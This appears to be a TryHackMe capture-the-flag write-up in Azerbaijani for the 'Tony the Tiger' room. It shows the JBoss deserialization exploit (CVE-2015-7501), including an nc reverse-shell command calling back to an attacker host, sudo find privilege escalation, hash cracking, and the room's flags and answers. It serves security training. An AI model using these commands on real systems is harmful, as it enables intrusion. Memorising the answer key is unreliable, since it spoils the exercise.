# TryHackMe — Tony the Tiger Writeup

**Çətinlik:** Easy  
**CVE:** CVE-2015-7501 (JBoss Java Deserialization RCE)  
**Məqsəd:** 3 flag tap — Steganography, JBoss shell, Root

---

## Tapşırıqlar və Cavablar

```
Task 2: Serialization nədir?
  2.1 → lamp
  2.2 → DoS
  2.3 → byte stream

Task 3: Reconnaissance
  3.1 → Apache-Coyote/1.1
  3.2 → JBoss

Task 4: Tony's Flag → THM{Tony_Sure_Loves_Frosted_Flakes}
Task 6: JBoss Flag  → THM{50c10ad46b5793704601ecdad865eb06}
Task 7: Root Flag   → zxcvbnm123456789
```

---

## Addım 1 — Nmap Skan

```bash
nmap -sV -sC -A <TARGET_IP>
```

**Nəticə:**
```
22/tcp   open  ssh
80/tcp   open  http   (Tony-nin bloqu)
8080/tcp open  http   Apache-Coyote/1.1 → JBoss AS
```

- Port 8080-də **JBoss Application Server** işləyir
- Task 3.1 cavabı: `Apache-Coyote/1.1`
- Task 3.2 cavabı: `JBoss`

---

## Addım 2 — Tony-nin Flag-ı (Steganography)

Port 80-də Tony-nin bloqu var. "Frosted Flakes" postunda şəkil var.

**Şəkli tap:**
```bash
curl -s http://<TARGET_IP>/posts/frosted-flakes/ | grep img
```

**Nəticə:**
```
https://i.imgur.com/be2sOV9.jpg
```

**Şəkli yüklə və flag-ı çıxart:**
```bash
wget https://i.imgur.com/be2sOV9.jpg
strings be2sOV9.jpg | grep THM
```

**Nəticə:**
```
THM{Tony_Sure_Loves_Frosted_Flakes}
```

### 🏳️ Flag 1: `THM{Tony_Sure_Loves_Frosted_Flakes}`

---

## Addım 3 — JBoss Exploit (CVE-2015-7501)

### jboss.zip faylını hazırla

```
credits.txt   → müəlliflər
exploit.py    → Python2 exploit skripti
ysoserial.jar → Java payload generator
```

### exploit.py-ni Java versiyasına uyğunlaşdır

`exploit.py`-nin 63-cü sətirindəki gadget chain-i dəyişdir:

```bash
# CommonsCollections1 istifadə et (CommonsCollections5 əvəzinə)
sed -i "s/CommonsCollections5/CommonsCollections1/g" exploit.py

# Java module açma flaglarını əlavə et
sed -i "s|gadget = check_output(\['java', '-jar'|gadget = check_output(['java', '--add-opens=java.base/java.util=ALL-UNNAMED', '--add-opens=java.base/java.lang=ALL-UNNAMED', '--add-opens=java.base/java.lang.reflect=ALL-UNNAMED', '--add-opens=java.base/java.io=ALL-UNNAMED', '--add-opens=java.management/javax.management=ALL-UNNAMED', '--add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED', '-jar'|" exploit.py
```

### Listener aç (Terminal 1):

```bash
nc -lvnp 4444
```

### Exploit işlət (Terminal 2):

```bash
python2 exploit.py <TARGET_IP>:8080 "nc -e /bin/bash <KALI_IP> 4444"
```

**Nəticə:**
```
[*] Target IP: 10.10.x.x
[*] Target PORT: 8080
[+] Command executed successfully
```

Shell gəlir:
```
connect to [KALI_IP] from (UNKNOWN) [TARGET_IP] xxxxx
```

### Shell-i interaktiv et:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Addım 4 — JBoss Flag-ı

Shell-də:

```bash
grep -R "THM{" /home/ 2>/dev/null
```

**Nəticə:**
```
/home/jboss/.jboss.txt:THM{50c10ad46b5793704601ecdad865eb06}
```

### 🏳️ Flag 2: `THM{50c10ad46b5793704601ecdad865eb06}`

---

## Addım 5 — Lateral Movement (cmnatic → jboss)

JBoss-un home qovluğunda note var:

```bash
cat /home/jboss/note
```

**Nəticə:**
```
Password: likeaboss
```

jboss istifadəçisinə keç:

```bash
su jboss
# şifrə: likeaboss
```

və ya SSH ilə:
```bash
ssh jboss@<TARGET_IP>
# şifrə: likeaboss
```

---

## Addım 6 — Privilege Escalation (jboss → root)

sudo icazələrini yoxla:

```bash
sudo -l
```

**Nəticə:**
```
User jboss may run the following commands:
    (ALL) NOPASSWD: /usr/bin/find
```

`find` komandasını sudo ilə root shell almaq üçün istifadə et:

```bash
sudo find . -exec /bin/bash \; -quit
```

İndi root-san:
```
root@thm-java-deserial:~#
```

---

## Addım 7 — Root Flag

```bash
cat /root/root.txt
```

**Nəticə (base64):**
```
QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y=
```

**Base64 decode et:**
```bash
cat /root/root.txt | base64 -d
```

**Nəticə (MD5 hash):**
```
BC77AC072EE30E3760806864E234C7CF
```

**hashcat ilə crack et:**
```bash
hashcat -a 0 -m 0 BC77AC072EE30E3760806864E234C7CF /usr/share/wordlists/rockyou.txt --force
```

**Nəticə:**
```
BC77AC072EE30E3760806864E234C7CF:zxcvbnm123456789
```

### 🏳️ Flag 3: `zxcvbnm123456789`

---

## Bütün Flaglar

| Task | Flag |
|---|---|
| Task 4 — Tony's Flag | `THM{Tony_Sure_Loves_Frosted_Flakes}` |
| Task 6 — JBoss Flag | `THM{50c10ad46b5793704601ecdad865eb06}` |
| Task 7 — Root Flag | `zxcvbnm123456789` |

---

## Attack Yolu Xülasəsi

```
Nmap → Port 8080 (JBoss), Port 80 (Blog)
  ↓
Blog → Frosted Flakes şəkli → strings → Flag 1
  ↓
jboss.zip exploit → CVE-2015-7501 → Reverse Shell (cmnatic)
  ↓
/home/jboss/.jboss.txt → Flag 2
  ↓
/home/jboss/note → şifrə: likeaboss → su jboss
  ↓
sudo -l → find NOPASSWD → sudo find . -exec /bin/bash \; -quit → ROOT
  ↓
/root/root.txt → base64 decode → MD5 → hashcat → Flag 3
```

---

## Konseptual Suallar (Task 2)

| Sual | Cavab |
|---|---|
| IRL Object nümunəsi | `lamp` |
| Serialization hücumunun nəticəsi | `DoS` |
| Objektlər nəyə çevrilir | `byte stream` |
